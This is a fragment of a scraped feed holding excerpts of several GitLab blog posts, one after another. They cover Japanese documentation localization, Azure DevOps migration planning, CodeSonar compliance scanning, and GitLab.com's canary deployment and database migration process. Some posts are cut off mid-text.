      "summary": "<p>Today we are thrilled to announce the release of GitLab product documentation in Japanese at <a href=\"http://docs.gitlab.com/ja-jp\" rel=\"\">docs.gitlab.com/ja-jp</a>. This major step marks our first move toward making GitLab's extensive documentation accessible to our users worldwide.</p><p><img alt=\"Japanese GitLab Docs site\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1765299500/hya4bog8gllk1kimduac.png\" /></p><h2 id=\"the-unique-challenge-of-the-japanese-market\">The unique challenge of the Japanese market</h2><p>Japan represents one of the world's largest economies and is a critical market for enterprise software. However, it also presents a distinctive challenge: despite its technological sophistication and massive developer community, English proficiency remains a significant barrier for many users.</p><p>Japan's developers and DevSecOps teams often face challenges with English-only documentation, <a href=\"https://www.ef.edu/epi/regions/asia/japan/\" rel=\"\">as indicated by the country's ranking on the EF English Proficiency Index</a>. This language barrier can significantly impact the speed of learning and ultimately influence the decision to evaluate, adopt, and champion a platform within Japanese organizations.</p><p>We've heard directly from our Japanese customers and partners that English-only documentation wasn't merely an inconvenience, it was a barrier preventing them from getting the most out of GitLab. The impact rippled through every stage of the user journey: From initial evaluation where teams struggled to assess GitLab's capabilities, to daily operations where finding solutions took longer than necessary, to staying current with new features and best practices.</p><p>In a market as competitive and mature as in Japan, this language barrier directly affected GitLab's market penetration. When Japanese companies evaluate enterprise software, the availability of comprehensive Japanese documentation signals long-term commitment to the market. It demonstrates that a provider isn't just making a token effort, but is genuinely invested in supporting Japanese users throughout their entire journey.</p><p>To address this challenge and demonstrate our commitment to the Japanese market, we built localization infrastructure from the ground up, integrating with how we create and maintain documentation at GitLab.</p><h2 id=\"localization-built-on-docs-as-code-principles\">Localization built on docs-as-code principles</h2><p>GitLab's documentation is treated like any other code contribution, residing alongside product code in GitLab projects and managed via merge requests. This system ensures documentation is version-controlled, collaboratively reviewed, and automatically tested through CI/CD pipelines, which includes checks for issues with language, formatting, and links. Both the English and Japanese documentation sites are dynamically generated using the Hugo static site generator and deployed after merging changes, guaranteeing users always access the latest information.</p><p>The documentation is extensive and comprehensive, drawing content from various source projects, including GitLab, GitLab Runner, Omnibus GitLab, GitLab Charts, GitLab Operator, and GitLab CLI (glab) (<a href=\"https://gitlab.com/gitlab-org/technical-writing/docs-gitlab-com/-/blob/main/doc/architecture.md\" rel=\"\">see architecture for details</a>). This sheer scale and rapid update velocity presented a significant localization challenge. To keep pace with the continuous evolution of these source English projects, we had to design a localization infrastructure for our GitLab product documentation that could handle these unique complexities and provide an enterprise-grade solution for a fully localized site, all while adhering to our CI/CD pipeline requirements.</p><h2 id=\"how-we-localized-gitlab-documentation\">How we localized GitLab Documentation</h2><p>For our initial Japanese localization, we adopted a strategy of integrating new folders within our existing English content structure. Specifically, we introduced <code>doc-locale/ja-jp</code> folders within each project that stores source Markdown files. This architecture <a href=\"https://gitlab.com/gitlab-org/gitlab/-/tree/master/doc-locale/ja-jp\" rel=\"\">keeps the translations right alongside their source content</a> while maintaining a clear organizational separation. Not only that, but it also enables us to apply the same robust version control, established review and collaboration workflows, and even some of the automated quality checks used for our English documentation to the translated content.</p><p>This <a href=\"https://handbook.gitlab.com/handbook/marketing/localization/tech_docs_localization/#multilingual-hugo-docs-implementation\" rel=\"\">internationalization infrastructure built for Japanese documentation</a> provides a scalable foundation for future language expansion. With the architecture, tooling, and processes now in place, we are well-positioned to support additional languages as we continue our commitment to making GitLab accessible to users worldwide.</p><h2 id=\"an-ai-assisted-translation-workflow-that-balances-speed-and-quality\">An AI-assisted  translation workflow that balances speed and quality</h2><p>We adopted a strategic, phased approach to processing the content through translation, prioritizing pages based on their English-language page views. The highest-traffic pages underwent AI translation first, followed by comprehensive human linguistic review, and we intentionally paused subsequent phases until these priority pages completed the full human review cycle. This deliberate sequencing allowed us to build a robust, curated translation memory and termbase from our most important content. These linguistic assets accelerated and improved quality across all remaining content. In parallel, this initial phase served as our testing ground on the technical infrastructure on the GitLab side. We used it to iterate and reinforce our CI/CD pipelines, refine our translation and post-editing AI scripts, and solidify our Translation MR review process.</p><p>To provide our international users with the most current documentation while guaranteeing high-quality translated content, <a href=\"https://handbook.gitlab.com/handbook/marketing/localization/tech_docs_localization/#translation-workflow\" rel=\"\">we implemented an AI-assisted translation workflow with human post-editing</a>, consisting of:</p><ul><li>Phase 1: AI-powered translation. We built a custom AI translation system enriched with GitLab-specific context including style guides, GitLab UI content translations, terminology databases, and original file context. This system intelligently handles GitLab's specialized markdown syntax (GLFM) and protects elements like placeholder variables, alert boxes, Hugo shortcodes, and GitLab-specific references that standard translation tools can't process out of the box.</li><li>Phase 2: Human linguistic review. Professional Japanese translators specialized in technical content then review and refine the AI translations. They work with GitLab's Japanese style guide, translation memory, and terminology database to ensure accuracy, natural language flow, and cultural appropriateness. These human-reviewed translations progressively replace the AI versions on the site.</li></ul><h2 id=\"technical-challenges-and-solutions\">Technical challenges and solutions</h2><p>Localizing GitLab's extensive documentation, while maintaining our docs-as-code principles and CI/CD-driven publishing workflow, required significant technical innovation. The challenges extended beyond translation itself: we needed to preserve complex markdown syntax, maintain automated testing standards, ensure seamless content fallbacks, and create sustainable processes for continuous updates across multiple source projects.</p><p>The English <strong>markdown file syntax complexity</strong> led us to developing custom code and regex in our Translation Management System (TMS) to protect codeblocks, URLs, and other functional elements that should not be exposed for translation.</p><p><img alt=\"Translation Management System\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1765299311/x3oglow15o5z6xthgxfn.png\" /></p><p>Due to the dynamics of how the English content is generated, we established an <strong>English fallback mechanism.</strong> Essentially, when the Japanese translation is not ready yet, the localized site seamlessly displays English content with translated navigation and UI, preventing 404s and maintaining language context via Hugo’s rendering system.</p><p>We enhanced the localized navigation and linking so that it adjusts dynamically and would persist the locale. We added <strong>anchor IDs</strong> in the translated files by pre-processing the English file before it’s sent for translation. That improves the experience for people navigating to a docs page from a link. The consistent anchor ID means they can change to either language and still land in the correct place in the page.</p><p><img alt=\"English fallback mechanism\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1765299310/uqimyjm0ltvpcnc7bowk.png\" /></p><p><a href=\"https://gitlab.com/groups/gitlab-com/localization/-/work_items/109\" rel=\"\">We also extended CI/CD pipelines</a> to test localized content in Translation MRs following the same quality standards as the English docs. It allows us to catch invalid Hugo shortcodes, spaces inside links, or bare URLs. It also identifies orphaned files and redirects files with no target files. You can see the jobs that run on the MRs containing translated documentation <a href=\"https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/ci/docs.gitlab-ci.yml\" rel=\"\">on the GitLab project  <code>.gitlab/ci/docs.gitlab-ci.yml</code> file</a>.</p><p>A centralized translation request system orchestrates the workflow, monitors the English files, identifies new and updated content, routes files for translation, automatically creates translation merge requests, tracks file status in translation requests and maintains an audit trail. To get docs translated <a href=\"https://gitlab.com/groups/gitlab-com/localization/tech-docs-forked-projects/prod/-/merge_requests/?sort=updated_asc&amp;state=merged&amp;label_name%5B%5D=gitlab-translation-service&amp;label_name%5B%5D=translation-upstream%3A%3A%20complete&amp;first_page_size=100\" rel=\"\">we processed 430 Translation MRs</a> with files ranging from 1-10 in each Translation MR.</p><p><img alt=\"Translation MRs\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1765299311/fgbrtapbmclj4pvdjh9k.png\" /></p><p>The result is a Japanese documentation experience that stays synchronized with English content updates, giving users faster access to critical information. Users can discover and navigate content fully in their language, with English appearing only for content that’s still in translation. They can trust GitLab’s quality standards while accessing the latest features quickly. All of this creates a sustainable, scalable foundation for future languages and documentation growth.</p><p>Learn more about all the technical details in our <a href=\"https://handbook.gitlab.com/handbook/marketing/localization/tech_docs_localization/\" rel=\"\">GitLab Product Documentation Handbook page</a>.</p><h2 id=\"visit-our-japanese-docs-site\">Visit our Japanese docs site</h2><p>Whether you're a longtime GitLab user or just getting started, we hope this localized documentation makes your DevSecOps journey smoother and more accessible.</p><p>This is just the beginning of our localization efforts, and your feedback is invaluable in helping us improve.

Identify champions or groups familiar with both ADO and GitLab platforms (such as early adopters) to help drive adoption and provide guidance.</p><p><strong>Inventory what you need to migrate:</strong></p><ul><li>The number of repositories, pull requests, and contributors</li><li>The number and complexity of work items and pipelines</li><li>Repository sizes and dependency relationships</li><li>Critical integrations and runner requirements (agent pools with specific capabilities)</li></ul><p>Use GitLab Professional Services's <a href=\"https://gitlab.com/gitlab-org/professional-services-automation/tools/utilities/evaluate#beta-azure-devops\" rel=\"\">Evaluate</a> tool to produce a complete inventory of your entire Azure DevOps organization, including repositories, PR counts, contributor lists, number of pipelines, work items, CI/CD variables and more. If you're working with the GitLab Professional Services team, share this report with your engagement manager or technical architect to help plan the migration.</p><p>Migration timing is primarily driven by pull request count, repository size, and amount of contributions (e.g. comments in PR, work items, etc). For example, 1,000 small repositories with few PRs and limited contributors can migrate much faster than a smaller set of repositories containing tens of thousands of PRs and thousands of contributors. Use your inventory data to estimate effort and plan test runs before proceeding with production migrations.</p><p>Compare inventory against your desired timeline and decide whether to migrate all repositories at once or in batches. If teams cannot migrate simultaneously, batch and stagger migrations to align with team schedules. For example, in Professional Services engagements, we organize migrations into waves of 200-300 projects to manage complexity and respect API rate limits, both in <a href=\"https://docs.gitlab.com/security/rate_limits/\" rel=\"\">GitLab</a> and <a href=\"https://learn.microsoft.com/en-us/azure/devops/integrate/concepts/rate-limits?view=azure-devops\" rel=\"\">ADO</a>.</p><p>GitLab's built-in <a href=\"https://docs.gitlab.com/user/project/import/repo_by_url/\" rel=\"\">repository importer</a> migrates Git repositories (commits, branches, and tags) one-by-one. Congregate is designed to preserve pull requests (known in GitLab as merge requests), comments, and related metadata where possible; the simple built-in repository import focuses only on the Git data (history, branches, and tags).</p><p><strong>Items that typically require separate migration or manual recreation:</strong></p><ul><li>Azure Pipelines - create equivalent GitLab CI/CD pipelines (consult with <a href=\"https://docs.gitlab.com/ci/yaml/\" rel=\"\">CI/CD YAML</a> and/or with <a href=\"https://docs.gitlab.com/ci/components/\" rel=\"\">CI/CD components</a>). Alternatively, consider using AI-based pipeline conversion available in Congregate.</li><li>Work items and boards - map to GitLab Issues, Epics, and Issue Boards.</li><li>Artifacts, container images (ACR) - migrate to GitLab Package Registry or Container Registry.</li><li>Service hooks and external integrations - recreate in GitLab.</li><li><a href=\"https://docs.gitlab.com/user/permissions/\" rel=\"\">Permissions models</a> differ between ADO and GitLab; review and plan permissions mapping rather than assuming exact preservation.</li></ul><p>Review what each tool (Congregate vs. built-in import) will migrate and choose the one that fits your needs. Make a list of any data or integrations that must be migrated or recreated manually.</p><p><strong>Who will run the migration?</strong></p><p>Migrations are typically run by a GitLab group owner or instance administrator, or by a designated migrator who has been granted the necessary permissions on the destination group/project. Congregate and the GitLab import APIs require valid authentication tokens for both Azure DevOps and GitLab.</p><ul><li>Decide whether a group owner/admin will perform the migrations or whether you will grant a specific team/person delegated access.</li><li>Ensure the migrator has correctly configured personal access tokens (Azure DevOps and GitLab) with the scopes required by your chosen migration tool (for example, api/read_repository scopes and any tool-specific requirements).</li><li>Test tokens and permissions with a small pilot migration.</li></ul><p><strong>Note:</strong> Congregate leverages file-based import functionality for ADO migrations and requires instance administrator permissions to run (<a href=\"https://docs.gitlab.com/user/project/settings/import_export/#migrate-projects-by-uploading-an-export-file\" rel=\"\">see our documentation</a>).

Non-admin account cannot preserve contribution attribution!</p><p><strong>What organizational structure do we want in GitLab?</strong></p><p>While it's possible to map ADO structure directly to GitLab structure, it's recommended to rationalize and simplify the structure during migration. Consider how teams will work in GitLab and design the structure to facilitate collaboration and access management. Here is a way to think about mapping ADO structure to GitLab structure:</p><pre><code>graph TD\n    subgraph GitLab\n        direction TB\n        A[&quot;Top-level Group&quot;]\n        B[&quot;Subgroup (optional)&quot;]\n        C[&quot;Projects&quot;]\n        A --&gt; B\n        A --&gt; C\n        B --&gt; C\n    end\n\n    subgraph AzureDevOps[&quot;Azure DevOps&quot;]\n        direction TB\n        F[&quot;Organizations&quot;]\n        G[&quot;Projects&quot;]\n        H[&quot;Repositories&quot;]\n        F --&gt; G\n        G --&gt; H\n    end\n\n    style A fill:#FC6D26\n    style B fill:#FC6D26\n    style C fill:#FC6D26\n    style F fill:#8C929D\n    style G fill:#8C929D\n    style H fill:#8C929D\n</code></pre><p>Recommended approach:</p><ul><li>Map each ADO organization to a GitLab group (or a small set of groups), not to many small groups. Avoid creating a GitLab group for every ADO team project. Use migration as an opportunity to rationalize your GitLab structure.</li><li>Use subgroups and project-level permissions to group related repositories.</li><li>Manage access to sets of projects by using GitLab groups and group membership (groups and subgroups) rather than one group per team project.</li><li>Review GitLab <a href=\"https://docs.gitlab.com/ee/user/permissions.html\" rel=\"\">permissions</a> and consider <a href=\"https://docs.gitlab.com/user/group/saml_sso/group_sync/\" rel=\"\">SAML Group Links</a> to implement an enterprise RBAC model for your GitLab instance (or a GitLab.com namespace).</li></ul><p><strong>ADO Boards and work items: State of migration</strong></p><p>It's important to understand how work items migrate from ADO into GitLab Plan (issues, epics, and boards).</p><ul><li>ADO Boards and work items map to GitLab Issues, Epics, and Issue Boards. Plan how your workflows and board configurations will translate.</li><li>ADO Epics and Features become GitLab Epics.</li><li>Other work item types (e.g., user stories, tasks, bugs) become project-scoped issues.</li><li>Most standard fields are preserved; selected custom fields can be migrated when supported.</li><li>Parent-child relationships are retained so Epics reference all related issues.</li><li>Links to pull requests are converted to merge request links to maintain development traceability.</li></ul><p>Example: Migration of an individual work item to a GitLab Issue, including field accuracy and relationships:</p><p><img alt=\"Example: Migration of an individual work item to a GitLab Issue\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1764769188/ztesjnxxfbwmfmtckyga.png\" /></p><p>Batching guidance:</p><ul><li>If you need to run migrations in batches, use your new group/subgroup structure to define batches (for example, by ADO organization or by product area).</li><li>Use inventory reports to drive batch selection and test each batch with a pilot migration before scaling.</li></ul><p><strong>Pipelines migration</strong></p><p>Congregate <a href=\"https://gitlab.com/gitlab-org/professional-services-automation/tools/migration/congregate/-/merge_requests/1298\" rel=\"\">recently introduced</a> AI-powered conversion for multi-stage YAML pipelines from Azure DevOps to GitLab CI/CD.

      "summary": "<p>Embedded systems development teams face a persistent challenge: maintaining development velocity while meeting stringent functional safety and code quality requirements. Standards like ISO 26262, IEC 62304, DO-178C, and IEC 61508 demand rigorous verification processes that are often manual and time-consuming. Compliance reviews against coding standards like MISRA C/C++, isolated scanning workflows, and post-development verification create bottlenecks. Teams are forced to choose between speed and safety.</p><p><a href=\"https://gitlab.com/explore/catalog/codesonar/components/codesonar-ci\" rel=\"\">GitLab's integration with CodeSonar</a> (from AdaCore) addresses this challenge by automating compliance workflows and enabling continuous verification throughout the development lifecycle.</p><h2 id=\"specialized-scanning-for-safety-critical-systems\">Specialized scanning for safety-critical systems</h2><p>Safety-critical systems require deep analysis of C/C++ code compiled with specialized embedded tools. These systems must demonstrate compliance with coding standards (MISRA C/C++, CERT C/C++, AUTOSAR C++) and functional safety frameworks (ISO 26262, DO-178C, IEC 61508) that require detailed evidence trails. Beyond aligning with coding standards, teams also need to address security concerns. This means testing for memory problems as well as a host of other problems like uninitialized variables and command injection.</p><p><a href=\"https://www.adacore.com/codesonar\" rel=\"\">CodeSonar</a> performs whole program analysis with specialized scanning capabilities for these standards. Pairing CodeSonar with GitLab enables teams to automate compliance workflows and maintain comprehensive audit trails throughout the development lifecycle.</p><h2 id=\"automating-compliance-from-commit-to-merge\">Automating compliance from commit to merge</h2><p>The GitLab and CodeSonar integration provides a compliance-as-code approach that automates policy enforcement from the earliest stages of development. CodeSonar functions as an additional scanner within <a href=\"https://docs.gitlab.com/ci/\" rel=\"\">GitLab CI/CD pipelines</a>, analyzing code in every commit and merge request.</p><p>Because CodeSonar was purpose-built for embedded systems, it performs deep control flow and data flow analysis across entire programs, identifying vulnerabilities like buffer overruns, data taint, uninitialized variables, use-after-free conditions, and command injection — the root causes of most security incidents in embedded systems.</p><p>The integration works through GitLab's CI/CD configuration. When developers push code changes, the pipeline triggers CodeSonar scanning. For C and C++ firmware, CodeSonar observes compiler invocations during the actual build process, creating an internal representation of the code that enables sophisticated analysis. Results are converted from SARIF format to GitLab's Static Application Security Testing (<a href=\"https://docs.gitlab.com/user/application_security/sast/\" rel=\"\">SAST</a>) format and surfaced directly in merge requests, where they feed into GitLab Ultimate's Security Dashboard, Vulnerability Management, and <a href=\"https://docs.gitlab.com/user/compliance/compliance_frameworks/\" rel=\"\">Compliance Frameworks</a>.</p><h2 id=\"example-workflow-iso-26262-asil-d-compliance\">Example workflow: ISO 26262 ASIL-D compliance</h2><p>The demo video below shows the complete workflow for an embedded system subject to ISO 26262 ASIL-D requirements. The scenario illustrates how embedded development teams can implement continuous compliance without compromising development velocity.</p><div></div><p>The workflow begins with a developer submitting a merge request for firmware changes. GitLab's CI/CD pipeline automatically triggers CodeSonar scanning, which performs deep C/C++ analysis against custom ISO 26262 policies configured in the pipeline. When CodeSonar identifies an ASIL-D relevant vulnerability, the pipeline halts automatically per the compliance policy, with clear documentation explaining the issue. The complete scan results, issue tracking, and approval workflow are maintained in GitLab as a single source of truth for audit trails.</p><p>Developers can use both the CodeSonar hub interface and <a href=\"https://docs.gitlab.com/user/gitlab_duo/\" rel=\"\">GitLab Duo AI</a> to understand the vulnerability. CodeSonar provides detailed information about the path through the source code that leads to the problem, along with code navigation features to isolate the root cause. GitLab Duo <a href=\"https://docs.gitlab.com/user/application_security/vulnerabilities/#vulnerability-explanation\" rel=\"\">explains the vulnerability</a> and provides specific <a href=\"https://docs.gitlab.com/user/application_security/vulnerabilities/#vulnerability-resolution\" rel=\"\">remediation recommendations</a>. After the developer implements the fix and validates the resolution, the code merges successfully with full compliance evidence automatically collected throughout the process.</p><h2 id=\"benefits-of-the-integration\">Benefits of the integration</h2><p>Organizations implementing this integrated compliance with GitLab and CodeSonar will see significant improvements in both development velocity and compliance confidence.</p><ul><li><strong>Efficiency gains:</strong> Development teams reduce time-to-market by catching coding standard compliance issues early when they're less expensive to fix. Automated security policy enforcement decreases manual security review overhead, freeing specialists to focus on complex problems rather than routine checks. Audit readiness improves through automated evidence collection. Compliance artifacts are generated as a by-product of normal development rather than through separate documentation efforts.</li><li><strong>Compliance maturity:</strong> This integrated approach helps organizations maintain continuous compliance with industry standards and regulations.

      "summary": "<p>Every day, GitLab deploys code changes to the world's largest GitLab instance — GitLab.com  — up to 12 times without any downtime. We use GitLab's own CI/CD platform to manage these deployments, which impact millions of developers worldwide. This deployment frequency serves as our primary quality gate and stress test. It also means our customers get access to new features within hours of development rather than waiting weeks or months. When organizations depend on GitLab for their DevOps workflows, they're using a platform that's proven at scale on our own infrastructure. In this article, you'll learn how we built an automated deployment pipeline using core GitLab CI/CD functionality to handle this deployment complexity.</p><h2 id=\"the-business-case-for-deployment-velocity\">The business case for deployment velocity</h2><p>For GitLab: Our deployment frequency isn't just an engineering metric — it's a business imperative. Rapid deployment cycles mean we can respond to customer feedback within hours, ship security patches immediately, and validate new features in production before scaling them.</p><p>For our customers: Every deployment to GitLab.com validates the deployment practices we recommend to our users. When you use GitLab's deployment features, you're using the same battle-tested approach that handles millions of git operations, CI/CD pipelines, and user interactions daily. You benefit from:</p><ul><li>Latest features available immediately: New capabilities reach you within hours of completion, not in quarterly release cycles</li><li>Proven reliability at scale: If a feature works on GitLab.com, you can trust it in your environment</li><li>Full value of GitLab: Zero-downtime deployments mean you never lose access to your DevOps platform, even during updates</li><li>Real-world tested practices: Our deployment documentation isn't theory — it's exactly how we run the largest GitLab instance in existence</li></ul><h2 id=\"code-flow-architecture\">Code flow architecture</h2><p>Our deployment pipeline follows a structured progression through multiple stages, each acting as a checkpoint on the journey from code proposal to production deployment.</p><pre><code>  graph TD\n      A[Code Proposed] --&gt; B[Merge Request Created]\n      B --&gt; C[Pipeline Triggered]\n      C --&gt; D[Build &amp; Test]\n      D --&gt; E{Spec/Integration/QA Tests Pass?}\n      E --&gt;|No| F[Feedback Loop]\n      F --&gt; B\n      E --&gt;|Yes| G[Merge to default branch]\n      G --&gt;|Periodically| H[Auto-Deploy Branch]\n\n      subgraph &quot;Deployment Pipeline&quot;\n          H --&gt; I[Package Creation]\n          I --&gt; K[Canary Environment]\n          K --&gt; L[QA Validation]\n          L --&gt; M[Main Environment]\n\n      end\n</code></pre><h2 id=\"deployment-pipeline-makeup\">Deployment pipeline makeup</h2><p>Our deployment approach uses GitLab's native CI/CD capabilities to orchestrate complex deployments across hybrid infrastructure.\nHere's how we do it.</p><h3 id=\"build\">Build</h3><p>Building GitLab is a complex topic in and of itself, so I'll go over the details at a high level.</p><p>We build both our Omnibus package and our Cloud Native GitLab (CNG) images. The Omnibus packages deploy to our Gitaly fleet (our Git storage layer), while CNG images run all other components as containerized workloads. Other stateful services like Postgres and Redis have grown so large we have dedicated teams managing them separately. For GitLab.com, those systems are not deployed during our Auto-Deploy procedures.</p><p>We have a scheduled pipeline that will regularly look at <code>gitlab-org/gitlab</code> and search for the most recent commit on the default branch with a successful (“green”) pipeline. Green pipelines signal that every component of GitLab has passed its comprehensive test suite. We then create an <strong>auto-deploy branch</strong> from that commit.</p><p>This triggers a sequence of events: primarily, the need to build this package and all components that are a part of our monolith.\nAnother scheduled pipeline selects the latest built package and initiates the deployment pipeline. Procedurally, it looks this simple:</p><pre><code>  graph LR\n      A[Create branch] --&gt; B[Build]\n      B --&gt; C[Choose Built package]\n      C --&gt; D[Start Deploy Pipeline]\n</code></pre><p>Building takes some time, and since deployments can vary due to various circumstances, we choose the latest build to deploy. We technically build more versions of GitLab for .com than will ever be deployed. This enables us to always have a package lined up ready to go, and this brings us the closest we can be to having a full continuously delivered product for .com.</p><h3 id=\"environment-based-validation-and-canary-strategy\">Environment-based validation and Canary strategy</h3><p>Quality assurance (QA) isn't just an afterthought here — it's baked into every layer from development through deployment. Our QA process leverages automated test suites that include unit tests, integration tests, and end-to-end tests that simulate real user interactions with GitLab's features. But more importantly for our deployment pipeline, our QA process works hand-in-hand with our Canary strategy through environment-based validation.</p><p>As part of our validation approach, we leverage GitLab's native <a href=\"https://docs.gitlab.com/user/project/canary_deployments/\" rel=\"\">Canary deployments</a>, enabling controlled validation of changes with limited traffic exposure before full production deployment. <a href=\"https://handbook.gitlab.com/handbook/engineering/infrastructure/environments/canary-stage/#environments-canary-stage\" rel=\"\">We send roughly 5% of all traffic through our Canary stage</a>. This approach increases the complexity of database migrations, but successfully navigating Canary deployments ensures we deploy a reliable product seamlessly.</p><p>The Canary deployment features you use in GitLab were refined through managing one of the most complex deployment scenarios in production. When you implement Canary deployments for your applications, you're using patterns proven at massive scale.</p><p>Our deployment process follows a progressive rollout strategy:</p><ol><li><strong>Staging Canary:</strong> Initial validation environment</li><li><strong>Production Canary:</strong> Limited production traffic</li><li><strong>Staging Main:</strong> Full staging environment deployment</li><li><strong>Production Main:</strong> Full production rollout</li></ol><pre><code>  graph TD\n      C[Staging Canary Deploy]\n      C --&gt; D[QA Smoke Main Stage Tests]\n      C --&gt; E[QA Smoke Canary Stage Tests]\n      D --&gt; F\n      E --&gt; F{Tests Pass?}\n      F --&gt;|Yes| G[Production Canary Deploy]\n      G --&gt; S[QA Smoke Main Stage Tests]\n      G --&gt; T[QA Smoke Canary Stage Tests]\n      F --&gt;|No| H[Issue Creation]\n      H --&gt; K[Fix &amp; Backport]\n      K --&gt; C\n\n      S --&gt; M[Canary Traffic Monitoring]\n      T --&gt; M[Canary Traffic Monitoring baking period]\n      M --&gt; U[Production Safety Checks]\n      U --&gt; N[Staging Main]\n      N --&gt; V[Production Main]\n</code></pre><p>Our QA validation occurs at multiple checkpoints throughout this progressive deployment process: after each Canary deployment, and again after post-deploy migrations. This multilayered approach ensures that each phase of our deployment strategy has its own safety net. You can learn more about <a href=\"https://handbook.gitlab.com/handbook/engineering/testing/\" rel=\"\">GitLab's comprehensive testing approach</a> in our handbook.</p><h2 id=\"deployment-pipeline\">Deployment pipeline</h2><p>Here are the challenges we address across our deployment pipeline.</p><h3 id=\"technical-architecture-considerations\">Technical architecture considerations</h3><p>GitLab.com represents real-world deployment complexity at scale. As the largest known GitLab instance, deployments use our official GitLab Helm chart and the official Linux package — the same artifacts our customers use. You can learn more about <a href=\"https://handbook.gitlab.com/handbook/engineering/infrastructure/production/architecture/#gitlab-com-architecture\" rel=\"\">the GitLab.com architecture</a> in our handbook. This hybrid approach means our deployment pipeline must intelligently handle both containerized services and traditional Linux services in the same deployment cycle.</p><p><strong>Dogfooding at scale:</strong> We deploy using the same procedures we document for <a href=\"https://docs.gitlab.com/update/zero_downtime/\" rel=\"\">zero-downtime upgrades</a>. If something doesn't work smoothly for us, we don't recommend it to customers. This self-imposed constraint drives continuous improvement in our deployment tooling.</p><p>The following stages are run for all environment and stage upgrades:</p><pre><code>  graph LR\n      a[prep] --&gt; c[Regular Migrations - Canary stage only]\n      a --&gt; f[Assets - Canary stage only]\n      c --&gt; d[Gitaly]\n      d --&gt; k8s\n\n      subgraph subGraph0[&quot;VM workloads&quot;]\n        d[&quot;Gitaly&quot;]\n      end\n\n      subgraph subGraph1[&quot;Kubernetes workloads&quot;]\n        k8s[&quot;k8s&quot;]\n      end\n\n      subgraph fleet[&quot;fleet&quot;]\n        subGraph0\n        subGraph1\n      end\n</code></pre><p><strong>Stage details:</strong></p><ul><li><strong>Prep:</strong> Validates deployment readiness and performs pre-deployment checks</li><li><strong>Migrations:</strong> Executes database regular migrations. This only happens during the Canary stage. Because both Canary and Main stages share the same database, these changes are already available when the Main stage deploys, eliminating the need to repeat these tasks.</li><li><strong>Assets:</strong> We leverage a GCS bucket for all static assets. If any new assets are created, we upload these to our bucket such that they are immediately available to our Canary stage. As we leverage WebPack for assets, and properly leverage SHAs in the naming of our assets, we can confidently not worry that we override an older asset. Therefore, old assets continue to be available for older deployments and new assets are imemdiately made available when Canary begins its deploy. This only happens during the Canary stage deployment. Because Canary and Main stages share the same asset storage, these changes are already available when the Main stage deploys.</li><li><strong>Gitaly:</strong> Updates Gitaly Virtual Machine storage layer via our Omnibus Linux package on each Gitaly node. This service is unique as we <a href=\"https://gitlab.com/gitlab-org/gitaly/-/blob/master/doc/git-execution-environments.md\" rel=\"\">bundle it with <code>git</code></a>. Therefore, we need to ensure that this service is capable of atomic upgrades. We leverage a <a href=\"https://gitlab.com/gitlab-org/gitaly/-/tree/master/cmd/gitaly-wrapper\" rel=\"\">wrapper around Gitaly</a>, which enables us to install a newer version of Gitaly and make use of the library <a href=\"https://github.com/cloudflare/tableflip\" rel=\"\"><code>tableflip</code></a> to cleanly rotate the running Gitaly, ensuring high availability of this service on each of our instances.</li><li><strong>Kubernetes:</strong> Deploys containerized GitLab components via our Helm chart. Note that we deploy to numerous clusters spread across Zones for redundancy, so these are usually broken into their own stages to minimize harm and sometimes allows us to stop mid-deploy if critical issues are detected.</li></ul><h3 id=\"multi-version-compatibility-the-hidden-challenge\">Multi-version compatibility: The hidden challenge</h3><p>As you read our process, you will notice that there's a period of time where our database schema is ahead of the code that the Main stage knows about. This happens because the Canary stage has already deployed new code and runs regular database migrations, but the Main stage is still running the previous version of the code that doesn't know about these new database changes.</p><p><strong>Real-world example:</strong> Imagine we're adding a new <code>merge_readiness</code> field to merge requests. During deployment, some servers are running code that expects this field. while others don't know it exists yet. If we handle this poorly, we break GitLab.com for millions of users. If we handle it well, nobody notices anything happened.</p><p>This occurs with most other services, as well. For example, if a client sends multiple requests, there's a chance one of them might land in our Canary stage; other requests might be directed to the Main stage. This is not too different from a deploy as it does take a decent amount of time to roll through the few thousand Pods that run our services.</p><p>With a few exceptions, the vast majority of our services will run a slightly newer version of that component in Canary for a period of time. In a sense, these scenarios are all transient states. But they can often persist for several hours or days in a live, production environment. Therefore, we must treat them with the same care as permanent states. During any deployment, we have multiple versions of GitLab running simultaneously and they all need to play nicely together.</p><h2 id=\"database-operations\">Database operations</h2><p>Database migrations present a unique challenge in our Canary deployment model. We need schema changes to support new features while maintaining our ability to roll back if issues arise. Our solution involves careful separation of concerns:</p><ul><li><strong>Regular migrations:</strong> Run during the Canary stage, designed to be backward-compatible, consists of only reversible changes</li><li><strong>Post-deploy migrations:</strong> The &quot;point of no return&quot; migrations that happen only after multiple successful deployments</li></ul><p>Database changes are handled with precision and extensive validation procedures:</p><pre><code>  graph LR\n      A[Regular Migrations] --&gt; B[Canary Stage Deploy]\n      B --&gt; C[Main Stage Deploy]\n      C --&gt; D[Post Deploy Migrations]\n\n</code></pre><h3 id=\"post-deploy-migrations\">Post-deploy migrations</h3><p>GitLab deployments involve many components. Updating GitLab is not atomic, so many components must be backward-compatible.</p><p>Post-deploy migrations often contain changes that can't be easily rolled back — think data transformations, column drops, or structural changes that would break older code versions. By running them <em>after</em> we've gained confidence through multiple successful deployments, we ensure:</p><ol><li><strong>The new code is stable</strong> and we're unlikely to need a rollback</li><li><strong>Performance characteristics</strong> are well understood in production</li><li><strong>Any edge cases</strong> have been discovered and addressed</li><li><strong>The blast radius</strong> is minimized if something does go wrong</li></ol><p>This approach provides the optimal balance: enabling rapid feature deployment through Canary releases while maintaining rollback capabilities until we have high confidence in deployment stability.</p><p><strong>The expand-migrate-contract pattern:</strong> Our database, frontend, and application compatibility changes follow a carefully orchestrated three-phase approach.</p><ol><li><strong>Expand:</strong> Add new structures (columns, indexes) while keeping old ones functional</li><li><strong>Migrate:</strong> Deploy new application code that uses the new structures</li><li><strong>Contract:</strong> Remove old structures in post-deploy migrations after everything is stable</li></ol><p><strong>Real-world example:</strong> When adding a new <code>merge_readiness</code> column to merge requests:</p><ol><li><strong>Expand:</strong> Add the new column with a default value; existing code ignores it</li><li><strong>Migrate:</strong> Deploy code that reads and writes to the new column while still supporting the old approach</li></ol><p>3 <strong>Contract:</strong> After several successful deployments, remove the old column in a post-deploy migration</p><p>All database operations, application code, frontend code, and more, 